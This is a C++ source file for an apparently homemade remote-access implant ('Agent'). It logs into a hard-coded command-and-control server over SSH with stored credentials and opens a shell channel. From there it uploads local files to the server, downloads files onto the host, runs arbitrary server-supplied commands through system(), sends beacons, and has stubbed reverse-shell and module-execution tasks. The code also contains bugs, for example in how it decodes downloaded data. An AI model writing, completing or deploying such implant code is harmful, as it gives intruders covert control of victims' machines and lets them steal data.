#include "agent.h"
#include "config.h"

// constructor for Agent class
Agent::Agent() {
	int rc = connect_ssh();
	if(rc != 0) {
		printf("[-] Failed to connect (%d). Bailing...", rc);
		exit(1);
	}
	rc = init_channel();
	if(rc != 0) {
		printf("[-] Failed to start channel (%d). Bailing...", rc);
		exit(1);
	}
}

// cleanup on instance destruction
Agent::~Agent() {
	if(this->session) {
		// clean up session
	}
	if(this->chan) {
		ssh_channel_close(this->chan);
    	ssh_channel_free(this->chan);
	}
}


/////////////////// PRIVATE FUNCTIONS ////////////////////////////

// PRIVATE: connects to the globally known host with username and password
int Agent::connect_ssh(){
	/*Connect to server*/
    int auth=0;
	printf("Attempting to connect to %s (%s)\n", HOST, PORT);

	// initialize ssh session structure
    this->session = ssh_new();
    if (this->session == NULL) {
        return 1;
    }

	// check and set username
	if(GLOB_ID != NULL){
        if (ssh_options_set(this->session, SSH_OPTIONS_USER, GLOB_ID) < 0) {
        	ssh_disconnect(this->session);
            return 2;
        }
    }

	// set target host
    if (ssh_options_set(this->session, SSH_OPTIONS_HOST, HOST) < 0) {
        return 3;
    }

	// set target port
	if (ssh_options_set(this->session, SSH_OPTIONS_PORT_STR, PORT)){
		return 4;
	}
	
	// do the connection
    if(ssh_connect(this->session)){
        fprintf(stderr,"Connection failed : %s\n",ssh_get_error(session));
        ssh_disconnect(session);
        return 7;
    }

	// get password
    auth = authenticate();
    if(auth == SSH_AUTH_SUCCESS){
        return 0;
    } else if(auth==SSH_AUTH_DENIED){
        fprintf(stderr,"Authentication failed\n");
    } else {
        fprintf(stderr,"Error while authenticating : %s\n",ssh_get_error(session));
    }
    ssh_disconnect(session);
    return 8;
}

// PRIVATE: authenticates with the remote host
int Agent::authenticate(){
	/*Do authentication through terminal. Trying to get rid of this :)*/
  	int rc;
  	int method;
  	char *banner;

  	// Try to authenticate
  	rc = ssh_userauth_none(this->session, NULL);
  	if (rc == SSH_AUTH_ERROR) {
    	fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(this->session));;
    	return rc;
  	}

  	method = ssh_auth_list(this->session);
  	while (rc != SSH_AUTH_SUCCESS) {
    	// Try to authenticate with password
    	if (method & SSH_AUTH_METHOD_PASSWORD) {
      		rc = ssh_userauth_password(this->session, NULL, GLOB_LOGIN);
      		if (rc == SSH_AUTH_ERROR) {
      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(this->session));
        		return rc;
      		} else if (rc == SSH_AUTH_SUCCESS) {
        		break;
      		}
    	}
  	}

  	banner = ssh_get_issue_banner(this->session);
  	if (banner) {
    	printf("%s\n",banner);
    	free(banner);
  	}

  	return rc;
}

// PRIVATE: initializes the channel to communicate with
int Agent::init_channel() {
	// Initialize vars
  	int rc;
	this->chan = ssh_channel_new(session);
	char ch;

	printf("[+] Created new SSH channel\n");
  	if (chan == NULL)
    	return SSH_ERROR;

	// Open channel
  	rc = ssh_channel_open_session(this->chan);
	printf("[+] Opened SSH Channel with remote server\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(this->chan);
    	return rc;
  	}

	// Request a shell interface
  	rc = ssh_channel_request_shell(this->chan);
	
	printf("[ ] Sent request for shell\n");
  	if (rc != SSH_OK)
  	{
    	ssh_channel_close(this->chan);
    	ssh_channel_free(this->chan);
    	return rc;
  	}
	return rc;
}

// PRIVATE: checked write to channel
int Agent::write(char *buffer, int len) {
	// writes data to channel
    int rc = ssh_channel_write(this->chan, buffer, len);
    if(rc == SSH_ERROR){
        printf("Failed to write data to channel: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
    }
	return rc;
}

// PRIVATE: checked read from channel
unsigned char *Agent::read(int len) {
	unsigned char *buffer = (unsigned char*)malloc(len); 
	// sanity check buffer
	if(buffer == nullptr) {
		printf("Malloc failed...\n");
		exit(1);
	}
	// read data
	int nbytes = ssh_channel_read(this->chan, buffer, len, 0);
	printf("read %d bytes from channel\n", nbytes);
	if (nbytes < 0){
		printf("Caught read error from server: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
    	return nullptr;
	}
	
	// all good
	return buffer;
}

// PRIVATE: receives a tasking operation from the server
AgentJob *Agent::read_tasking(){
	// read and convert the header to usable thing
	unsigned char *header = this->read(8); 
	if(header == nullptr) return nullptr;
	unsigned long h_val = AgentJob::bytes_to_long(header);
	free(header);
	AgentJob *job = new AgentJob(h_val, nullptr);

	// now that we know the length, fetch the payload
	unsigned char *data = this->read(job->get_len()); 
	if(data == nullptr) {
		// free stuff if the read fails
		delete job;
		return nullptr;
	}

	// set payload and return
	job->set_data(data);
	return job;
}







/////////////////////////// PUBLIC FUNCTIONS ////////////////////////////

// directly forwards traffic along port 
int Agent::direct_forwarding(){
	return 0;
}
/*int Agent::direct_forwarding()
{
	// EXAMPLE FOR NOW 
  	ssh_channel forwarding_channel;
  	int rc = 0;
 	char *http_get = "GET / HTTP/1.1\nHost: www.google.com\n\n";
  	int nbytes, nwritten;

	forwarding_channel = ssh_channel_new(session);
	if (forwarding_channel == NULL) {
    	return rc;
  	}

  	rc = ssh_channel_open_forward(forwarding_channel, "www.google.com", 80, "localhost", 5555);
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(forwarding_channel);
    	return rc;
  	}

  	nbytes = strlen(http_get);
  	nwritten = ssh_channel_write(forwarding_channel, http_get, nbytes);

  	if (nbytes != nwritten)
  	{
    	ssh_channel_free(forwarding_channel);
    	return SSH_ERROR;
  	}
  
  	ssh_channel_free(forwarding_channel);
  	return SSH_OK;
}*/


// uploads file to the server
int Agent::upload_file(void *path) {
	/*
	
	Notes for later: 
	State: server transport blocked read, burden of unblocking here.
	
	*/




	// initialize variables
	char directory[BUFSIZ];
	char tmpbuffer[8];
    char *file_data;
    char *enc_data;
    int size = 0;
    size_t size_e = 0;
    int rc = 0;
	int offset = Common::index_of((char*)path, '/', 1);
	memset(directory, 0, sizeof(directory));
	memset(tmpbuffer, 0, sizeof(tmpbuffer));
    

	// get info aboutthe file
	//printf("Sending file -> %s\n", path);
	size = Common::get_file((char*)path, &file_data);

	path = path + offset +1;
	// TODO: Update to next-gen tasking structure
	//sprintf(buff, "11|%s", path);
	//if(this->write(buff,strlen(buff)) == SSH_ERROR) return 1;
	
	// sanity check to make sure the file exists    
    if(size < 0){
        printf("Filename '%s' does not exist\n", path); 
        if(this->write("er", 3) == SSH_ERROR){
            printf("Failed to write data to channel: %s\n",  ssh_get_error(ssh_channel_get_session(chan)));
        }
        return 2;
    }
    
	// get b64-encoded data size	
    size_e = B64::enc_size(size);
    sprintf(tmpbuffer, "%ld", size_e);
        
    // writes file size
    if(this->write(tmpbuffer, sizeof(tmpbuffer)) == SSH_ERROR) return 1;
	unsigned char *buffer = this->read(size); 
    if(buffer == nullptr) return 1;

	// encode the data
    B64::encode((unsigned char *)file_data, size, &enc_data);
        
    // writes file
	if(this->write(enc_data, size_e) == SSH_ERROR) return 1;
    
	// free stuff
	free(file_data);
    free(enc_data);
	free(buffer);

	unsigned char *t = this->read(8); 
	if(t == nullptr) return 1;
    
	free(t);
    return 0;
}

// downloads a file from the server
int Agent::download_file(void *filename){
	unsigned long size = 0;
    int size_e = 0;
    char *data_ptr;
    char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    FILE *file;
	memset(buff, 0, sizeof(buff));
	
	// TODO: Add check OK function here too to make sure no errors actually show up on the server's end
	unsigned char *size_dat = this->read(8); 
	if(size_dat == nullptr) return 1;
    
    size = AgentJob::bytes_to_long(size_dat);
    data_ptr = (char*)malloc(size+1);
    memset(data_ptr, 0, size+1);
            
    // writes file size
	if(this->write("ok", 3) == SSH_ERROR) return 1;
    unsigned char *data = this->read(size); 
	if(data == nullptr) {
		free(data_ptr);
		return 1;
	}

    size_e = B64::dec_size(data_ptr);

	enc_ptr = (char*)malloc(size_e);
	if(!B64::decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
        printf("Failed to decode data\n");
        free(data_ptr);
        free(enc_ptr);
        return 1;
    }
    free(data_ptr);
            
    // writes file 
    if(this->write("ok", 3) == SSH_ERROR) return 1;
    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    sprintf(buff, "%s/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), filename);
	file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);
    free(enc_ptr);

    return 0;
}


// parses a particular task for the agent to handle
AgentJob *Agent::parse_tasking(unsigned long tasking){
	AgentJob *job = new AgentJob(tasking, nullptr);
	void *data = this->read(job->get_len());
	if(data == nullptr) {
		delete job;
		return nullptr;
	}
	job->set_data(data);
	return job;
}


// run the agent's main loop
int Agent::run()
{
	printf("Identified as an agent\n");
	// say we are sending our beacon
	// TODO: update this to new tasking design
	if(this->write("1", 2) == SSH_ERROR) return SSH_ERROR;
	
	//char *beacon = get_beacon();
	AgentJob *nulltask = new AgentJob(AGENT_RESPONSE_OK, nullptr);
				
	//if(write(beacon, strlen(beacon)) == SSH_ERROR) return SSH_ERROR;
	// block until we have a new task to do
	AgentJob *job = this->read_tasking();
	while(job != nullptr){
		printf("Reading..\n");
		switch(job->get_type()) {
			case AGENT_DIE:
				printf("Got agent exit request\n");
				break;
			case AGENT_SLEEP:
				printf("Got sleep request\n");
				break;
			case AGENT_DOWNLOAD_FILE:
				printf("Got tasking to download file\n");
				download_file(job->get_data());
				break;
			case AGENT_UPLOAD_FILE:
				upload_file(job->get_data());
				break;
			case AGENT_REVERSE_SHELL:
				printf("Got tasking to start reverse shell\n");
				//shell_unix(chan);
				break;
			case AGENT_EXECUTE_SHELLSCRIPT:
				printf("Got tasking to execute command %s\n", (char*)(job->get_data()));
				system((char*)(job->get_data()));
				if(this->write((char*)nulltask->encode_header(), 0) == SSH_ERROR) return SSH_ERROR;
				break;
			case AGENT_EXECUTE_BINARY:
				printf("Got tasking to execute module\n");
				//exec_module((char*)(job->get_data()));
				break;
			case AGENT_SEND_BEACON:
				{
					printf("Got send beacon request\n");
					char *beacon = get_beacon();
					AgentJob *beacon_job = new AgentJob(AGENT_SEND_BEACON, strlen(beacon), beacon);
					int len = beacon_job->get_len()+8;
					printf("Length: %lu\n", len);
					if(this->write((char*)beacon_job->pack(), len) == SSH_ERROR) return SSH_ERROR;
					break;
				}
			default:
				printf("Caught unknown tasking value: %d\n", job->get_type());
				break;
		}

		// get the next job
		job = this->read_tasking();
	}
		
	// close connections
	// TODO: Update this to new structure
	if(this->write("00|", 4) == SSH_ERROR) return SSH_ERROR;
	return SSH_OK;
}